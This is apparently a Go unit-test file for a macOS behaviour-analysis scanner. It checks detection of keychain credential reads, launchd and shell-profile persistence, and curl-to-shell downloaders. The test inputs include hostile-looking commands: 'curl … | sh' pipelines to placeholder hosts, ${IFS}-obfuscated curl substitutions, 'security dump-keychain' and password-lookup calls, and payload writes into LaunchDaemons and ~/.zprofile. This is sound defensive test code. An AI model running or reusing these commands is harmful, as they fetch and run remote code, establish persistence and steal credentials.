package extract

import (
	"encoding/base64"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestSecurityReadsCredentialStoreUsesClosedReadSubcommands(t *testing.T) {
	for _, test := range []struct {
		fields []string
		want   bool
	}{
		{fields: []string{"security", "dump-keychain"}, want: true},
		{fields: []string{"security", "export", "-k", "login.keychain-db"}, want: true},
		{fields: []string{"security", "find-generic-password", "-s", "example"}, want: true},
		{fields: []string{"security", "find-internet-password", "-s", "example"}, want: true},
		{fields: []string{"security", "-q", "find-generic-password", "-s", "example"}, want: true},
		{fields: []string{"security", "-qvl", "find-key"}, want: true},
		{fields: []string{"security", "find-key", "-t", "private"}, want: true},
		{fields: []string{"security", "find-key", "-tsymmetric"}, want: true},
		{fields: []string{"security", "find-key", "-t", "public"}},
		{fields: []string{"security", "find-identity", "-v"}, want: true},
		{fields: []string{"security", "export", "-k", "login.keychain-db"}, want: true},
		{fields: []string{"security", "export", "-t", "privKeys"}, want: true},
		{fields: []string{"security", "export", "-tidentities"}, want: true},
		{fields: []string{"security", "export", "-t", "certs"}},
		{fields: []string{"security", "export", "-tpubKeys"}},
		{fields: []string{"security", "export", "-t", "$TYPE"}},
		{fields: []string{"security", "list-keychains"}},
		{fields: []string{"security", "add-generic-password"}},
		{fields: []string{"security", "delete-generic-password"}},
		{fields: []string{"security", "unlock-keychain"}},
		{fields: []string{"security", "list-keychains", "find-generic-password"}},
		{fields: []string{"security", "DUMP-KEYCHAIN"}},
		{fields: []string{"security", "-i", "find-generic-password"}},
		{fields: []string{"security", "-p", "prompt", "find-generic-password"}, want: true},
		{fields: []string{"security", "-pprompt", "find-generic-password"}, want: true},
		{fields: []string{"security", "--unknown", "find-generic-password"}},
		{fields: []string{"security"}},
	} {
		if got := securityReadsCredentialStore(test.fields); got != test.want {
			t.Errorf("securityReadsCredentialStore(%q) = %t, want %t", test.fields, got, test.want)
		}
	}
}

func TestCommandFieldsHonorsQuotes(t *testing.T) {
	fields, err := CommandFields(`python "agent script.py" --flag 'two words'`)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"python", "agent script.py", "--flag", "two words"}
	if len(fields) != len(want) {
		t.Fatalf("fields = %#v, want %#v", fields, want)
	}
	for i := range want {
		if fields[i] != want[i] {
			t.Fatalf("fields = %#v, want %#v", fields, want)
		}
	}
}

func TestCommandFieldsRejectsMalformedInput(t *testing.T) {
	if _, err := CommandFields(`python "agent.py`); err == nil {
		t.Fatal("expected unterminated quote error")
	}
	if _, err := CommandFields(`python agent.py\`); err == nil {
		t.Fatal("expected unterminated escape error")
	}
}

func TestLaunchdResourceCategoryRequiresConcreteAgentOrDaemonContext(t *testing.T) {
	tests := []struct {
		value string
		want  string
	}{
		{"/Library/LaunchDaemons/com.example.service.plist", "launch-daemon"},
		{"system/com.example.service", "launch-daemon"},
		{"~/Library/LaunchAgents/com.example.service.plist", "launch-agent"},
		{"gui/501/com.example.service", "launch-agent"},
		{"user/501/com.example.service", "launch-agent"},
		{"login/123/com.example.service", "launch-agent"},
		{"com.example.service.plist", "launchd-service"},
		{"/tmp/com.example.service.plist", "launchd-service"},
		{"", "launchd-service"},
	}
	for _, tt := range tests {
		if got := launchdResourceCategory(tt.value); got != tt.want {
			t.Errorf("launchdResourceCategory(%q) = %q, want %q", tt.value, got, tt.want)
		}
	}
}

func TestLaunchdInstallPathRequiresCanonicalDirectPlistLocation(t *testing.T) {
	tests := []struct {
		path string
		want bool
	}{
		{"/Library/LaunchDaemons/com.example.service.plist", true},
		{"/System/Library/LaunchAgents/com.example.agent.plist", true},
		{"/Users/alice/Library/LaunchAgents/com.example.agent.plist", true},
		{"/var/root/Library/LaunchAgents/com.example.agent.plist", true},
		{"~/Library/LaunchAgents/com.example.agent.plist", true},
		{"$HOME/Library/LaunchAgents/com.example.agent.plist", true},
		{"${HOME}/Library/LaunchAgents/com.example.agent.plist", true},
		{"/tmp/root/Library/LaunchAgents/com.example.agent.plist", false},
		{"/Users/alice/project/Library/LaunchAgents/com.example.agent.plist", false},
		{"Library/LaunchAgents/com.example.agent.plist", false},
		{"~/Library/LaunchDaemons/com.example.service.plist", false},
		{"/Library/LaunchAgents/nested/com.example.agent.plist", false},
		{"/Library/LaunchAgents/com.example.agent", false},
		{"/Library/LaunchAgentss/com.example.agent.plist", false},
	}
	for _, test := range tests {
		if got := isLaunchdPath(test.path); got != test.want {
			t.Errorf("isLaunchdPath(%q) = %v, want %v", test.path, got, test.want)
		}
	}
}

func TestShellLaunchdInstallKeepsCopyDestinationAsUnresolvedOperand(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-1", ScopeID: "scope-1", LogicalPath: "install.sh"},
		`cp /tmp/job.plist /Library/LaunchDaemons/com.example.job.plist`,
		4,
		testConnectedExecution("root-1"),
		"ev-line",
	)
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationLaunchdJobInstall {
			continue
		}
		job, ok := operation.FirstBinding(behavior.ResourceRoleJob)
		if !ok || job.Resource.Value != "" || !job.Resource.HasClassification(behavior.ResourceClassLaunchDaemon) {
			t.Fatalf("launchd install resource = %#v", operation.ResourceBindings)
		}
		if operation.Qualifiers["destination_operand"] != "/Library/LaunchDaemons/com.example.job.plist" {
			t.Fatalf("launchd install operand = %#v", operation.Qualifiers)
		}
		return
	}
	t.Fatalf("canonical launchd copy was not modeled: %#v", graph.Operations)
}

func TestShellLaunchdExactRedirectionRetainsJobIdentity(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-1", ScopeID: "scope-1", LogicalPath: "install.sh"},
		`printf '%s' payload > /Library/LaunchAgents/com.example.job.plist`,
		2,
		testConnectedExecution("root-1"),
		"ev-line",
	)
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationLaunchdJobInstall {
			continue
		}
		job, ok := operation.FirstBinding(behavior.ResourceRoleJob)
		if !ok || job.Resource.Value != "/Library/LaunchAgents/com.example.job.plist" || len(operation.Qualifiers) != 0 {
			t.Fatalf("exact redirection launchd install = %#v", operation)
		}
		return
	}
	t.Fatalf("exact launchd redirection was not modeled: %#v", graph.Operations)
}

func TestShellLaunchdInstallRejectsStagedNestedAndNonPlistPaths(t *testing.T) {
	for _, line := range []string{
		`cp /tmp/job.plist /tmp/root/Library/LaunchAgents/com.example.job.plist`,
		`cp /tmp/job.plist /Library/LaunchAgents/nested/com.example.job.plist`,
		`cp /tmp/job.plist /Library/LaunchAgents/com.example.job`,
	} {
		var graph behavior.Graph
		AnalyzeShellLine(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "install.sh"}, line, 1, unknownExecutionContext(), "ev-line")
		for _, operation := range graph.Operations {
			if operation.Kind == behavior.OperationLaunchdJobInstall {
				t.Fatalf("non-installed path %q produced launchd persistence: %#v", line, operation)
			}
		}
	}
}

func TestShellProfilePathRequiresCanonicalUserOrSystemRoot(t *testing.T) {
	tests := []struct {
		path string
		want bool
	}{
		{"~/.zshrc", true},
		{"$HOME/.bash_profile", true},
		{"${HOME}/.config/fish/config.fish", true},
		{"/Users/alice/.zprofile", true},
		{"/Users/alice/.config/fish/config.fish", true},
		{"/var/root/.zshrc", true},
		{"/etc/zshenv", true},
		{"/opt/homebrew/etc/fish/config.fish", true},
		{"/tmp/stage/.zshrc", false},
		{"/tmp/stage/.config/fish/config.fish", false},
		{"/Users/alice/project/.config/fish/config.fish", false},
		{"relative/.zprofile", false},
		{"/Users/alice/.zshrc.backup", false},
	}
	for _, test := range tests {
		if got := isShellProfilePath(test.path); got != test.want {
			t.Errorf("isShellProfilePath(%q) = %v, want %v", test.path, got, test.want)
		}
	}
}

func TestShellProfileCopyKeepsDestinationAsUnresolvedOperand(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-1", ScopeID: "scope-1", LogicalPath: "install.sh"},
		`cp /tmp/profile ~/.zprofile`,
		3,
		testConnectedExecution("root-1"),
		"ev-line",
	)
	for _, operation := range graph.Operations {
		if operation.Kind != behavior.OperationShellProfileModify {
			continue
		}
		target, ok := operation.FirstBinding(behavior.ResourceRoleTarget)
		if !ok || target.Resource.Value != "" || !target.Resource.HasClassification(behavior.ResourceClassShellProfile) {
			t.Fatalf("shell-profile copy resource = %#v", operation.ResourceBindings)
		}
		if operation.Qualifiers["destination_operand"] != "~/.zprofile" {
			t.Fatalf("shell-profile destination operand = %#v", operation.Qualifiers)
		}
		return
	}
	t.Fatalf("canonical shell-profile copy was not modeled: %#v", graph.Operations)
}

func TestShellProfileWriteRejectsStagedLookalike(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-1", LogicalPath: "install.sh"},
		`printf '%s' payload > /tmp/stage/.config/fish/config.fish`,
		1,
		unknownExecutionContext(),
		"ev-line",
	)
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationShellProfileModify {
			t.Fatalf("staged fish config produced shell-profile persistence: %#v", operation)
		}
	}
}

func TestExtractPlistClassifiesLaunchdResourceFromInstallPath(t *testing.T) {
	body := []byte(`<plist><dict><key>Label</key><string>com.example.service</string><key>Program</key><string>/tmp/helper</string></dict></plist>`)
	for _, tt := range []struct {
		path string
		want string
	}{
		{"/Library/LaunchDaemons/com.example.service.plist", "launch-daemon"},
		{"~/Library/LaunchAgents/com.example.service.plist", "launch-agent"},
		{"/tmp/com.example.service.plist", "launchd-service"},
	} {
		t.Run(tt.want, func(t *testing.T) {
			var graph behavior.Graph
			ExtractPlist(&graph, artifact.Content{NodeID: "node-0001", LogicalPath: tt.path, Data: body}, PlistExecutionStart{})
			for _, operation := range graph.Operations {
				if operation.Kind == behavior.OperationLaunchdJobDeclare && testResourceCategory(operation.RequiredResource()) == tt.want {
					return
				}
			}
			t.Fatalf("launchd operation = %#v, want category %q", graph.Operations, tt.want)
		})
	}
}

func TestExtractPlistTreatsArchivedLaunchdTemplateAsDeclaration(t *testing.T) {
	body := []byte(`<plist><dict><key>Label</key><string>com.example.service</string><key>Program</key><string>/tmp/helper</string></dict></plist>`)
	var graph behavior.Graph
	ExtractPlist(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "sample.pkg!Payload!Library/protect/app/bin/com.example.service.plist",
		Data:        body,
	}, PlistExecutionStart{})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("bundled template became an execution root: roots=%#v operations=%#v", graph.ExecutionRoots, graph.Operations)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("bundled template command was not retained with unknown connectivity: %#v", graph.Operations)
	}
	for _, feature := range graph.Features {
		if feature.Key == "launchd.program" && feature.Value == "/tmp/helper" {
			return
		}
	}
	t.Fatalf("bundled template declaration feature missing: %#v", graph.Features)
}

func TestExtractPlistTreatsArchivedInstalledLaunchDaemonAsExecutionRoot(t *testing.T) {
	body := []byte(`<plist><dict><key>Label</key><string>com.example.service</string><key>Program</key><string>/tmp/helper</string></dict></plist>`)
	var graph behavior.Graph
	ExtractPlist(&graph, artifact.Content{
		NodeID:             "node-0001",
		LogicalPath:        "sample.pkg!Payload!Library/LaunchDaemons/com.example.service.plist",
		PackageInstallPath: "/Library/LaunchDaemons/com.example.service.plist",
		Data:               body,
	}, PlistExecutionStart{})
	if len(graph.ExecutionRoots) != 1 || len(graph.Operations) == 0 {
		t.Fatalf("installed launch daemon was not modeled as an execution root: %#v", graph)
	}
}

func TestExtractPlistDoesNotTrustArchivedCanonicalLaunchdPath(t *testing.T) {
	body := []byte(`<plist><dict><key>Label</key><string>com.example.service</string><key>Program</key><string>/tmp/helper</string></dict></plist>`)
	var graph behavior.Graph
	ExtractPlist(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "sample.zip!root/Library/LaunchDaemons/com.example.service.plist",
		Data:        body,
	}, PlistExecutionStart{})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("archive member name manufactured a launchd root: %#v", graph.ExecutionRoots)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("archive declaration was not retained conservatively: %#v", graph.Operations)
	}
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == "launchd-install-context" && coverage.Status == "partial" {
			return
		}
	}
	t.Fatalf("unresolved archived install context was not reported: %#v", graph.Coverage)
}

func TestIneligiblePackagedPlistRetainsDeclarationsWithoutRoots(t *testing.T) {
	body := []byte(`<plist><dict>
<key>CFBundleURLTypes</key><array><dict><key>CFBundleURLSchemes</key><array><string>packaged-demo</string></array></dict></array>
<key>CFBundleDocumentTypes</key><array><dict><key>CFBundleTypeName</key><string>Demo document</string><key>CFBundleTypeExtensions</key><array><string>demo</string></array></dict></array>
<key>Label</key><string>com.example.packaged</string><key>Program</key><string>/tmp/helper</string>
</dict></plist>`)
	var graph behavior.Graph
	ExtractPlist(&graph, artifact.Content{
		NodeID:                        "node-0001",
		LogicalPath:                   "carrier!carchive!payload/Library/LaunchDaemons/com.example.packaged.plist",
		Data:                          body,
		ExecutionRootEligibilityKnown: true,
		ExecutionRootEligible:         false,
	}, PlistExecutionStart{})
	if len(graph.ExecutionRoots) != 0 {
		t.Fatalf("ineligible packaged plist declared roots: roots=%#v operations=%#v", graph.ExecutionRoots, graph.Operations)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationProcessExecute || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("ineligible packaged plist command was not retained with unknown connectivity: %#v", graph.Operations)
	}
	wantFeatures := map[string]bool{"bundle.url_scheme": false, "bundle.document_type": false, "launchd.program": false}
	for _, feature := range graph.Features {
		if _, ok := wantFeatures[feature.Key]; ok {
			wantFeatures[feature.Key] = true
		}
	}
	for key, found := range wantFeatures {
		if !found {
			t.Fatalf("packaged plist declaration %q missing: %#v", key, graph.Features)
		}
	}
}

func TestSplitCommandsHonorsQuotes(t *testing.T) {
	got := splitCommands(`echo "a;b && c || d"; curl https://example.invalid/p | sh`)
	want := []string{`echo "a;b && c || d"`, `curl https://example.invalid/p | sh`}
	assertStringSlice(t, got, want)
}

func TestSplitPipelineHonorsQuotesAndOr(t *testing.T) {
	got := splitPipeline(`echo "a|b" || curl https://example.invalid/p | sh`)
	want := []string{`echo "a|b" || curl https://example.invalid/p`, `sh`}
	assertStringSlice(t, got, want)
}

func TestSplitPipelineKeepsNestedSubstitutionPipes(t *testing.T) {
	got := splitPipeline(`printf "$(printf x | tr x y)" | sh`)
	want := []string{`printf "$(printf x | tr x y)"`, `sh`}
	assertStringSlice(t, got, want)
}

func TestAnalyzeShellLineFindsPipelineAfterCommandSeparator(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `echo ok; curl https://example.invalid/p | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("expected one pipes-to relation, got %#v", graph.Relations)
	}
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://example.invalid/p") {
		t.Fatalf("unexpected network details: %#v", graph.Network)
	}
	for _, operation := range graph.Operations {
		if operation.Execution.Connectivity != behavior.ConnectivityConnected || len(operation.Execution.ExecutionRootIDs) != 1 || operation.Execution.ExecutionRootIDs[0] != "root-0001" {
			t.Fatalf("operation missing execution-root ownership: %#v", graph.Operations)
		}
	}
}

func TestAnalyzeShellLineStripsConditionalControlWords(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "macpatch.sh"}
	AnalyzeShellLine(
		&graph,
		content,
		`if curl -s -o /var/tmp/CDrivers.zip https://download.example/CDrivers.zip && [[ -f /var/tmp/CDrivers.zip ]]; then`,
		29,
		testConnectedExecution("root-0001"),
		"ev-0001",
	)

	assertShellOperation(t, graph, "network.download", "file", "/var/tmp/CDrivers.zip")
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://download.example/CDrivers.zip") {
		t.Fatalf("conditional downloader network detail = %#v", graph.Network)
	}
	if got := FirstShellCommand(`if curl https://download.example/CDrivers.zip; then`); got != "curl" {
		t.Fatalf("FirstShellCommand() = %q, want curl", got)
	}
}

func TestAnalyzeShellLineStripsConditionalControlWordsInPipeline(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "loader.sh"}
	AnalyzeShellLine(&graph, content, `if ! curl https://download.example/payload | sh; then`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 || !hasRelationKind(graph.Relations, behavior.RelationPipesTo) {
		t.Fatalf("conditional pipeline chain = %#v", graph.Relations)
	}
}

func TestAnalyzeShellLineControlOnlyStatementsAreNotExecutables(t *testing.T) {
	for _, line := range []string{"then", "else", "fi", "do", "done", "esac"} {
		var graph behavior.Graph
		AnalyzeShellLine(&graph, artifact.Content{NodeID: "node-0001"}, line, 1, unknownExecutionContext(), "ev-0001")
		if len(graph.Operations) != 0 {
			t.Fatalf("control statement %q produced operations: %#v", line, graph.Operations)
		}
	}
}

func TestAnalyzeShellLineExpandsLiteralAssignmentCommands(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `URL=https://assigned.example/p; curl "$URL" | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("expected one pipes-to relation, got %#v", graph.Relations)
	}
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://assigned.example/p") {
		t.Fatalf("unexpected network details: %#v", graph.Network)
	}
}

func TestAnalyzeShellLineHandlesLeadingCommandAssignments(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `HTTPS_PROXY=http://proxy.invalid curl https://assigned-prefix.example/p | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("expected one pipes-to relation, got %#v", graph.Relations)
	}
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://assigned-prefix.example/p") {
		t.Fatalf("unexpected network details: %#v", graph.Network)
	}
}

func TestAnalyzeShellLineDoesNotExpandDynamicAssignments(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `URL=$(get-url); curl "$URL" | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Network) != 1 {
		t.Fatalf("expected one unresolved network detail: %#v", graph.Network)
	}
	if len(networkOperationDestinations(graph)) != 0 {
		t.Fatalf("dynamic assignment should not produce a concrete destination: %#v", graph.Network)
	}
	for _, operation := range graph.Operations {
		if operation.Kind == "network.download" {
			remote, ok := operation.FirstBinding(behavior.ResourceRoleRemoteSource)
			if !ok || remote.Resource.Value != "" || len(operation.Qualifiers) != 0 {
				t.Fatalf("unresolved destination should remain an empty typed remote-source binding: %#v", operation)
			}
		}
	}
}

func TestFirstShellCommandSkipsAssignmentCommands(t *testing.T) {
	got := FirstShellCommand(`URL=https://assigned.example/p; curl "$URL" | sh`)
	if got != "curl" {
		t.Fatalf("FirstShellCommand = %q, want curl", got)
	}
	got = FirstShellCommand(`URL=$(get-url); curl "$URL" | sh`)
	if got != "curl" {
		t.Fatalf("FirstShellCommand with dynamic assignment = %q, want curl", got)
	}
	fields := FirstShellCommandFields(`URL=https://assigned.example/p; curl "$URL" | sh`)
	want := []string{"curl", "$URL"}
	assertStringSlice(t, fields, want)
	fields = FirstShellCommandFields(`HTTPS_PROXY=http://proxy.invalid curl https://example.invalid/p | sh`)
	want = []string{"curl", "https://example.invalid/p"}
	assertStringSlice(t, fields, want)
}

func TestFirstShellCommandFieldsStopsAfterFirstCommand(t *testing.T) {
	line := `curl https://first.example/p | sh; ` + strings.Repeat("ignored;", 10000)
	fields := FirstShellCommandFields(line)
	want := []string{"curl", "https://first.example/p"}
	assertStringSlice(t, fields, want)
}

func TestAnalyzeShellLineReportsStatementLimit(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(
		&graph,
		content,
		strings.Repeat("true;", maxShellStatementsPerLine+1),
		1,
		testConnectedExecution("root-0001"),
		"ev-0001",
	)
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("shell statement truncation must be visible in coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineReportsPipelineSegmentLimit(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	line := "echo value" + strings.Repeat(" | cat", maxShellPipelineParts+1)
	AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("shell pipeline truncation must be visible in coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineUnwrapsCommandWrappers(t *testing.T) {
	tests := []string{
		`sudo curl https://sudo.example/p | sh`,
		`sudo -E -u root curl https://sudouser.example/p | sh`,
		`env HTTPS_PROXY=http://proxy.invalid curl https://env.example/p | sh`,
		`/usr/bin/env -S "curl https://envsplit.example/p" | sh`,
		`command curl https://command.example/p | sh`,
		`sudo HTTPS_PROXY=http://proxy.invalid curl https://sudoenv.example/p | sh`,
		`nohup curl https://nohup.example/p | osascript >/dev/null 2>&1 &`,
	}
	for _, line := range tests {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
			t.Fatalf("%q: expected one pipes-to relation, got %#v", line, graph.Relations)
		}
		if len(graph.Network) != 1 || len(networkOperationDestinations(graph)) == 0 {
			t.Fatalf("%q: missing network detail: %#v", line, graph.Network)
		}
	}
}

func TestAnalyzeShellLineWrapperAssignmentsAreNotCommands(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `env URL=https://not-command.example/p`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("env assignment should not become behavior: operations=%#v network=%#v relations=%#v", graph.Operations, graph.Network, graph.Relations)
	}
}

func TestAnalyzeShellLineDownloaderDestinationsIgnoreOptionValues(t *testing.T) {
	tests := []struct {
		name string
		line string
		want string
	}{
		{
			name: "curl header and proxy",
			line: `curl -H "Host: header.example" -x http://proxy.example https://real.example/p`,
			want: "https://real.example/p",
		},
		{
			name: "curl url option",
			line: `curl --url https://url-option.example/p -H "Referer: https://referer.example/"`,
			want: "https://url-option.example/p",
		},
		{
			name: "wget header",
			line: `wget --header "Host: header.example" -O /tmp/p https://wget-real.example/p`,
			want: "https://wget-real.example/p",
		},
		{
			name: "pipeline",
			line: `curl -H "Host: header.example" https://pipe-real.example/p | sh`,
			want: "https://pipe-real.example/p",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
			AnalyzeShellLine(&graph, content, tt.line, 1, testConnectedExecution("root-0001"), "ev-0001")
			if len(graph.Network) != 1 {
				t.Fatalf("expected one network detail, got %#v", graph.Network)
			}
			assertStringSlice(t, networkOperationDestinations(graph), []string{tt.want})
		})
	}
}

func TestAnalyzeShellLineDoesNotTreatCommandSubstitutionAsExecutable(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `if [[ $(sysctl -n hw.optional.arm.FEAT_SSBS) -eq 0 ]]; then`, 1, testConnectedExecution("root-0001"), "ev-0001")
	for _, operation := range graph.Operations {
		if operation.Kind == "process.execute" {
			t.Fatalf("command substitution should not become executable operation: %#v", graph.Operations)
		}
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("unsupported command substitution lacks explicit partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineReportsEmbeddedExecutableSubstitution(t *testing.T) {
	for _, line := range []string{
		`$(curl${IFS}https://hidden.example/p)`,
		`printf %s "$(curl${IFS}https://hidden.example/p)"`,
		"printf %s `curl${IFS}https://hidden.example/p`",
		`printf %s <(curl${IFS}https://hidden.example/p)`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("%q lacks explicit substitution coverage: %#v", line, graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineIgnoresLiteralSingleQuotedSubstitution(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"},
		`printf '%s' '$(not-a-command)' '<(also-literal)'`,
		1,
		testConnectedExecution("root-0001"),
		"ev-0001",
	)
	if hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("literal single-quoted text was treated as executable substitution: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineRejectsAmbiguousAssignmentExpansion(t *testing.T) {
	for _, line := range []string{
		`DIR=$(dirname $0 2>/dev/null)`,
		`env DIR=$(dirname $0 2>/dev/null) curl https://not-concrete.example/p | sh`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("ambiguous assignment exposed concrete behavior: network=%#v relations=%#v", graph.Network, graph.Relations)
		}
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("ambiguous syntax lacks explicit partial coverage: %#v", graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineReportsAtomicAssignmentCommandSubstitution(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `X=$(curl${IFS}https://hidden.example/p)`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("assignment substitution exposed concrete behavior: operations=%#v network=%#v relations=%#v", graph.Operations, graph.Network, graph.Relations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("assignment command substitution lacks explicit partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineRejectsAtomicAssignmentSubstitutionBeforeOuterCommand(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `X=$(curl${IFS}https://hidden.example/p) /usr/bin/id`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("leading assignment substitution exposed partial or misleading behavior: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("leading assignment substitution lacks explicit partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineRejectsAmbiguousSudoOptionExpansion(t *testing.T) {
	for _, line := range []string{
		`sudo -u $(printf user) curl https://sudo-option.example/p | sh`,
		`sudo -u$(printf user) curl https://sudo-inline.example/p | sh`,
		`sudo -u$(curl${IFS}https://hidden.example/p) /usr/bin/id`,
		`env -C$(curl${IFS}https://hidden.example/p) /usr/bin/id`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("%q exposed behavior through an ambiguous sudo option: %#v", line, graph)
		}
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("%q lacks explicit partial coverage: %#v", line, graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineRejectsMalformedPipelineBeforeModeling(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `curl https://malformed.example/p | sh "`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("malformed pipeline produced modeled behavior: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("malformed pipeline lacks explicit partial coverage: %#v", graph.Coverage)
	}
}

